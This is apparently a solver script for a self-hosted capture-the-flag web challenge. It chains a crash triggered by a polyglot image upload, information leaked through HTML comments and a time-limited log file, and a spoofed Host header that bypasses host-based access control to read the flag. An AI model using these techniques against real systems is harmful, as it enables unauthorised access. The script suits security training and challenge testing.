#!/usr/bin/env python3
"""
Test Exploit Script for hidemenot Challenge

This script demonstrates how to exploit the various stages of the hidemenot challenge,
including polyglot uploads, alternative decoding, and host header bypass.
"""

import requests
import time
from datetime import datetime
from PIL import Image
import io

class HidemenotExploit:
    def __init__(self, base_url='http://localhost:5000'):
        self.base_url = base_url
        self.session = requests.Session()
        
    def register_and_login(self, username='testuser', password='testpass'):
        """Register and login to the application"""
        print("🔐 Registering and logging in...")
        
        # Register
        register_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(f'{self.base_url}/register', data=register_data)
        print(f"Registration response: {response.status_code}")
        
        # Login
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(f'{self.base_url}/login', data=login_data)
        print(f"Login response: {response.status_code}")
        
        return response.status_code == 200
    
    def create_polyglot_file(self):
        """Create a polyglot file for upload"""
        print("📁 Creating polyglot file...")
        
        polyglot_data = bytearray()
        polyglot_data.extend(b'\x89PNG\r\n\x1a\n')  # PNG magic
        polyglot_data.extend(b'JFIF\x00\x01')       # JPEG marker
        polyglot_data.extend(b'\x00' * 100)         # Padding
        
        return polyglot_data
    
    def trigger_crash(self):
        """Upload polyglot file to trigger server crash"""
        print("💥 Triggering server crash with polyglot upload...")
        
        polyglot_data = self.create_polyglot_file()
        
        files = {
            'image': ('polyglot.png', io.BytesIO(polyglot_data), 'image/png')
        }
        
        data = {
            'message': 'test message'
        }
        
        response = self.session.post(f'{self.base_url}/encode', files=files, data=data)
        print(f"Upload response: {response.status_code}")
        
        # Should redirect to homepage
        if response.status_code == 200 and 'homepage' in response.url:
            print("✅ Successfully triggered crash!")
            return True
        
        return False
    
    def check_homepage_source(self):
        """Check homepage source for hidden comment"""
        print("🔍 Checking homepage source for hidden comment...")
        
        response = self.session.get(f'{self.base_url}/')
        
        if '<!-- crash_image_url:' in response.text:
            # Extract crash image URL
            import re
            match = re.search(r'<!-- crash_image_url: ([^>]+) -->', response.text)
            if match:
                crash_image_url = match.group(1).strip()
                print(f"🎯 Found crash image URL: {crash_image_url}")
                return crash_image_url
        
        print("❌ No crash image URL found in source")
        return None
    
    def decode_crash_image_alternative(self):
        """Try to decode crash image with alternative method"""
        print("🔓 Attempting alternative decode of crash image...")
        
        response = self.session.get(f'{self.base_url}/decode-alternative')
        
        if response.status_code == 200:
            try:
                data = response.json()
                if 'message' in data:
                    print(f"✅ Alternative decode successful!")
                    print(f"Hidden message: {data['message']}")
                    return data['message']
            except:
                pass
        
        print("❌ Alternative decode failed")
        return None
    
    def extract_log_path(self, message):
        """Extract log file path from decoded message"""
        if not message:
            return None
            
        import re
        # Look for log file path pattern
        match = re.search(r'/admin[^/]+/logs/[\d-]+\.log', message)
        if match:
            log_path = match.group(0)
            print(f"📄 Found log path: {log_path}")
            return log_path
        
        return None
    
    def access_log_file(self, log_path):
        """Access the time-sensitive log file"""
        print(f"⏰ Accessing log file: {log_path}")
        
        response = self.session.get(f'{self.base_url}{log_path}')
        
        if response.status_code == 200:
            if 'Too late' not in response.text:
                print("✅ Successfully accessed log file!")
                print(f"Log content:\n{response.text}")
                return response.text
            else:
                print("❌ Too late - file was deleted")
        else:
            print(f"❌ Failed to access log file: {response.status_code}")
        
        return None
    
    def extract_flag_path(self, log_content):
        """Extract flag file path from log content"""
        if not log_content:
            return None
            
        import re
        match = re.search(r'/admin[^/]+/flag\.txt', log_content)
        if match:
            flag_path = match.group(0)
            print(f"🚩 Found flag path: {flag_path}")
            return flag_path
        
        return None
    
    def bypass_host_check(self, flag_path):
        """Bypass host-based access control for flag"""
        print("🌐 Attempting host header bypass...")
        
        # First try without bypass (should fail)
        response = self.session.get(f'{self.base_url}{flag_path}')
        if 'youtube.com' in response.url or 'rickroll' in response.text.lower():
            print("🎵 Got rickrolled - access control is working")
        
        # Now try with host header bypass
        headers = {'Host': '127.0.0.1'}
        response = self.session.get(f'{self.base_url}{flag_path}', headers=headers)
        
        if response.status_code == 200 and 'CTF{' in response.text:
            print("🎉 SUCCESS! Host bypass worked!")
            print(f"Final flag: {response.text}")
            return response.text
        
        print("❌ Host bypass failed")
        return None
    
    def full_exploit(self):
        """Run the complete exploit chain"""
        print("🚀 Starting full hidemenot exploit...")
        print("=" * 60)
        
        # Stage 1: Authentication
        if not self.register_and_login():
            print("❌ Failed to register/login")
            return False
        
        # Stage 2: Trigger crash
        if not self.trigger_crash():
            print("❌ Failed to trigger crash")
            return False
        
        # Small delay to ensure crash is processed
        time.sleep(2)
        
        # Stage 3: Find crash image URL
        crash_image_url = self.check_homepage_source()
        if not crash_image_url:
            return False
        
        # Stage 4: Alternative decode
        hidden_message = self.decode_crash_image_alternative()
        if not hidden_message:
            return False
        
        # Stage 5: Extract and access log
        log_path = self.extract_log_path(hidden_message)
        if not log_path:
            print("❌ Could not extract log path")
            return False
        
        log_content = self.access_log_file(log_path)
        if not log_content:
            return False
        
        # Stage 6: Extract and access flag
        flag_path = self.extract_flag_path(log_content)
        if not flag_path:
            print("❌ Could not extract flag path")
            return False
        
        final_flag = self.bypass_host_check(flag_path)
        if final_flag:
            print("\n🏆 CHALLENGE COMPLETED SUCCESSFULLY!")
            return True
        
        return False

def main():
    """Main function to run exploit"""
    print("🎯 hidemenot Challenge Exploit Tool")
    print("=" * 40)
    
    # Check if server is running
    try:
        response = requests.get('http://localhost:5000', timeout=5)
        print("✅ Server is running")
    except:
        print("❌ Server not running. Start with: python app.py")
        return
    
    exploit = HidemenotExploit()
    
    print("\nChoose an option:")
    print("1. Run full automated exploit")
    print("2. Manual step-by-step mode")
    print("3. Test individual components")
    
    choice = input("Enter choice (1-3): ").strip()
    
    if choice == '1':
        exploit.full_exploit()
    elif choice == '2':
        print("Manual mode - follow the prompts:")
        print("1. First, trigger crash by uploading polyglot file")
        print("2. Check homepage source for crash_image_url comment")
        print("3. Use alternative decoder on crash image")
        print("4. Access log file quickly (within 5 minutes)")
        print("5. Extract flag path and bypass host check")
    elif choice == '3':
        print("Testing individual components...")
        exploit.register_and_login()
        polyglot = exploit.create_polyglot_file()
        print(f"Created polyglot: {len(polyglot)} bytes")
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
